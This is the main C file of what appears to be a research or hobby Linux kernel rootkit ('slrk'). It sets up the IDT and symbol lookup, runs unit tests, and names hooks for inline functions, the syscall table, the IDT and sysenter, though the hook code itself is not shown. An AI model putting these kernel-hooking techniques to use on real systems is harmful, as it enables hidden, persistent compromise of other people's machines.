#include "slrk.h"
#include "tests.h"

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/debugfs.h>
#include <linux/kallsyms.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <asm/uaccess.h>
#include "test.h"

static int __init rootkit_init_module(void)
{
    /* Init rootkit */
    idt_init();
    init_symbols();

    init_unit_tests();
    run_unit_tests();
    return 0;

    /* Run some tests */
    test_inline_hooking();
    test_syscall_tbl();
    test_idt_hijacking();
    test_sysenter();

    return 0;
}

static void __exit rootkit_cleanup_module(void)
{
    cleanup_unit_tests();
    /* Restore the changed entries or the whole table */
    //idt_restore();
    //syscall_tbl_restore();
    //ia32_syscall_tbl_restore();
    //sysenter_hook_disable();
}

module_init(rootkit_init_module);
module_exit(rootkit_cleanup_module);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Adrien Schildknecht <adrien+dev@schischi.me>");
MODULE_DESCRIPTION("TODO");
